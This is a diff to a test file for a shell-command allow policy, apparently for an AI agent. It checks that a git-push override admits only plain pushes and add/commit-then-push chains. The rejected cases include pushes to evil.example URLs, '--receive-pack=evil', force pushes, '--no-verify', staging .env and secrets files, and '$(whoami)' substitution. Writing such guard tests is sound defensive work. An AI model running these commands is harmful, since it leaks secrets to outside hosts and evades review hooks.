@@ -202,6 +202,44 @@ await check("allow_git_push_override_matches_only_a_plain_single_push", () => {
   assert.equal(m("git push > out.txt"), false);
   assert.equal(m("git push &"), false);
   assert.equal(m("git push $(echo origin)"), false);
+
+  // Publish flags and refs the workflow needs.
+  for (const ok of [
+    "git push -u origin main", "git push --set-upstream origin feature/x", "git push --follow-tags", "git push --tags origin",
+    "git push --dry-run origin main", "git push origin HEAD", "git push origin main:main", "git push origin v1.2.3",
+  ]) assert.equal(m(ok), true, ok);
+  // Force, delete, hook bypass, code-running options, URLs and odd refs never ride on the override.
+  for (const bad of [
+    "git push --force", "git push -f origin main", "git push --force-with-lease", "git push origin +main",
+    "git push origin :main", "git push origin main:", "git push --delete origin main", "git push -d origin x",
+    "git push --no-verify", "git push --mirror", "git push --prune origin", "git push --exec=calc origin",
+    "git push --receive-pack=evil origin", "git push --repo=https://evil.example/x.git",
+    "git push https://evil.example/x.git main", "git push git@evil.example:x/y.git main",
+    "git push origin main extra", "git push origin a..b", "git push origin a:b:c", "git push origin --force",
+  ]) assert.equal(m(bad), false, bad);
+});
+
+await check("allow_git_push_override_allows_add_or_commit_then_push_in_one_call", () => {
+  const m = (command: string) => policy.shellOverrideMatches("ALLOW_GIT_PUSH", command, workspaceDir, "bash");
+  assert.equal(m("git add -A && git commit -m 'feat: x' && git push origin main"), true);
+  assert.equal(m("git commit -m 'fix' && git push"), true);
+  assert.equal(m("git add lib/a.ts scripts/b.ts && git commit -m x && git push -u origin main"), true);
+  assert.equal(m("git push && git commit -m x"), false, "push must be last");
+  assert.equal(m("git commit -m x && rm -rf dist && git push"), false, "only add/commit may precede the push");
+  assert.equal(m("git commit -m x && git push && git push"), false, "one push");
+  assert.equal(m("git add a && git add b && git commit -m x && git push"), false, "at most three segments");
+  assert.equal(m("git commit --no-verify -m x && git push"), false, "no hook bypass");
+  assert.equal(m("git commit --amend -m x && git push"), false, "no history rewrite");
+  assert.equal(m("git add -f build/ && git push"), false, "no force-adding ignored files");
+  assert.equal(m("git add .env && git push"), false, "no staging secrets");
+  assert.equal(m("git add -A -- config/secrets.json && git push"), false);
+  assert.equal(m("git add ../outside && git push"), false);
+  assert.equal(m("git add * && git push"), false, "no globs");
+  assert.equal(m("git commit -m x | cat && git push"), false, "pipes never match");
+  assert.equal(m("git commit -m \"$(whoami)\" && git push"), false, "substitutions never match");
+  assert.equal(m("git commit -m x && git push > out.txt"), false);
+  assert.equal(m("git commit -m x && git push &"), false);
+  assert.equal(m("git -C other commit -m x && git push"), false, "global flags are not plain");
 });
 
 await check("allow_env_read_override_matches_only_one_real_dotenv_file_in_the_workspace", () => {
@@ -273,7 +311,10 @@ await check("overrides_need_env_enablement_a_reason_and_a_matching_command", () 
     assert.deepEqual([push.tier, push.rule], ["allow", "override.ALLOW_GIT_PUSH"]);
     assert.equal(ev("git push", "ALLOW_GIT_PUSH").tier, "ask", "no reason, no override");
     assert.equal(ev("git push", "ALLOW_GIT_PUSH", "   ").tier, "ask", "a blank reason is no reason");
-    assert.equal(ev("git push && echo hi", "ALLOW_GIT_PUSH", "release").tier, "ask", "chains do not qualify");
+    assert.equal(ev("git push && echo hi", "ALLOW_GIT_PUSH", "release").tier, "ask", "other chains do not qualify");
+    const staged = ev("git add -A && git commit -m 'release' && git push origin main", "ALLOW_GIT_PUSH", "release v1");
+    assert.deepEqual([staged.tier, staged.rule], ["allow", "override.ALLOW_GIT_PUSH"]);
+    assert.notEqual(ev("git push --force origin main", "ALLOW_GIT_PUSH", "release v1").rule, "override.ALLOW_GIT_PUSH", "force never rides on the override");
 
     const env = ev("cat .env", "ALLOW_ENV_READ", "debugging config");
     assert.deepEqual([env.tier, env.rule], ["allow", "override.ALLOW_ENV_READ"]);
